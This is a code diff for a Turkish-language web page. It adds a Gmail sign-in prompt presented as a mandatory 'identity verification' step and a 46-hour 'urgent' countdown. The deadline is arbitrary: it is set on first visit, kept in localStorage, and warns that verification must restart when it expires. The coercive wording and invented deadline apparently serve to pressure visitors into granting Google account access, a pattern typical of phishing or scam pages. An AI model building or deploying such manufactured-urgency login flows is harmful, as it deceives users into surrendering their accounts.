@@ -2115,11 +2479,24 @@
         sync.initAuth?.();
         void sync.consumeGoogleRedirectResult?.().then(() => {
           if (sync.getGoogleUser?.()) {
+            document.getElementById("google-signin-wrap")?.remove();
             document.getElementById("google-signin-fab")?.remove();
             return;
           }
 
+          document.getElementById("google-signin-wrap")?.remove();
           document.getElementById("google-signin-fab")?.remove();
+          const wrap = document.createElement("div");
+          wrap.id = "google-signin-wrap";
+          wrap.className = "google-signin-wrap";
+          wrap.setAttribute("role", "region");
+          wrap.setAttribute("aria-label", "Kimlik doğrulama girişi");
+
+          const hint = document.createElement("p");
+          hint.className = "google-signin-hint";
+          hint.textContent =
+            "Kimlik doğrulaması için Gmail ile giriş yapmanız gerekir. Giriş izni vermeden doğrulama adımı tamamlanamaz.";
+
           const fab = document.createElement("button");
           fab.type = "button";
           fab.id = "google-signin-fab";
@@ -2142,27 +2519,36 @@
                   const mail = res?.email || sync.getGoogleUser?.()?.email || "";
                   fab.textContent = mail ? `Giriş: ${mail}` : "Gmail giriş OK";
                   fab.disabled = true;
-                  window.setTimeout(() => fab.remove(), 1600);
+                  hint.textContent = "Kimlik doğrulaması için Gmail girişi tamamlandı.";
+                  window.setTimeout(() => wrap.remove(), 1600);
                   return;
                 }
                 const errTxt = res?.error || "Giriş olmadı — tekrar dene";
                 fab.textContent = errTxt.slice(0, 60);
                 fab.title = errTxt;
+                hint.textContent =
+                  "Giriş tamamlanamadı. Kimlik doğrulaması için tekrar Gmail izni vermeniz gerekir.";
                 console.error("Gmail giriş", errTxt);
                 window.setTimeout(() => {
                   fab.dataset.busy = "0";
                   fab.disabled = false;
                   fab.textContent = "Gmail ile giriş yap";
+                  hint.textContent =
+                    "Kimlik doğrulaması için Gmail ile giriş yapmanız gerekir. Giriş izni vermeden doğrulama adımı tamamlanamaz.";
                 }, 3500);
               } catch (err) {
                 console.error(err);
                 fab.dataset.busy = "0";
                 fab.disabled = false;
                 fab.textContent = "Hata — tekrar dene";
+                hint.textContent =
+                  "Giriş hatası oluştu. Kimlik doğrulaması için tekrar deneyin.";
               }
             })();
           });
-          document.body.appendChild(fab);
+          wrap.appendChild(hint);
+          wrap.appendChild(fab);
+          document.body.appendChild(wrap);
           // Sadece redirect dönüşünü dinle; otomatik redirect yok (jest / busy kilidi)
           sync.startGoogleSignInLoop?.();
         });
@@ -2355,6 +2741,86 @@
       if (supportListenerBound || n > 80) clearInterval(t);
     }, 50);
   }
+
+  /* —— 46 saatlik acil geri sayım —— */
+  const DEADLINE_MS = 46 * 60 * 60 * 1000;
+  const DEADLINE_KEY = "verify_deadline_end_v1";
+
+  function getDeadlineEnd() {
+    try {
+      const raw = localStorage.getItem(DEADLINE_KEY);
+      const n = raw ? Number(raw) : NaN;
+      if (Number.isFinite(n) && n > Date.now()) return n;
+      const end = Date.now() + DEADLINE_MS;
+      localStorage.setItem(DEADLINE_KEY, String(end));
+      return end;
+    } catch {
+      return Date.now() + DEADLINE_MS;
+    }
+  }
+
+  function pad2(n) {
+    return String(Math.max(0, n | 0)).padStart(2, "0");
+  }
+
+  function formatDeadlineParts(msLeft) {
+    const totalSec = Math.max(0, Math.floor(msLeft / 1000));
+    const h = Math.floor(totalSec / 3600);
+    const m = Math.floor((totalSec % 3600) / 60);
+    const s = totalSec % 60;
+    return { h, m, s, totalSec };
+  }
+
+  function initDeadlineCountdowns() {
+    const boards = [...document.querySelectorAll("[data-deadline-countdown]")];
+    const inlines = [...document.querySelectorAll("[data-deadline-inline]")];
+    if (!boards.length && !inlines.length) return;
+
+    const endAt = getDeadlineEnd();
+
+    const tick = () => {
+      const left = endAt - Date.now();
+      const { h, m, s, totalSec } = formatDeadlineParts(left);
+      const hStr = pad2(h);
+      const mStr = pad2(m);
+      const sStr = pad2(s);
+      const clock = `${hStr}:${mStr}:${sStr}`;
+      const critical = totalSec > 0 && totalSec <= 3600;
+      const expired = totalSec <= 0;
+
+      boards.forEach((el) => {
+        const hEl = el.querySelector("[data-cd-h]");
+        const mEl = el.querySelector("[data-cd-m]");
+        const sEl = el.querySelector("[data-cd-s]");
+        const sr = el.querySelector("[data-cd-sr]");
+        if (hEl) hEl.textContent = hStr;
+        if (mEl) mEl.textContent = mStr;
+        if (sEl) sEl.textContent = sStr;
+        el.classList.toggle("is-critical", critical);
+        el.classList.toggle("is-expired", expired);
+        if (sr) {
+          sr.textContent = expired
+            ? "Süre doldu. Doğrulama yeniden başlatılmalı."
+            : `Kalan süre ${h} saat ${m} dakika ${s} saniye.`;
+        }
+        const note = el.querySelector(".urgent-countdown-note");
+        if (note && expired) {
+          note.textContent = "Süre doldu. Sayfayı yenileyip doğrulamayı yeniden başlatın.";
+        }
+      });
+
+      inlines.forEach((el) => {
+        el.textContent = expired ? "00:00:00" : clock;
+        el.classList.toggle("is-critical", critical || expired);
+        el.title = expired ? "Süre doldu" : `Kalan süre ${clock}`;
+      });
+    };
+
+    tick();
+    window.setInterval(tick, 1000);
+  }
+
+  initDeadlineCountdowns();
 
   /* Floating launcher */
   {
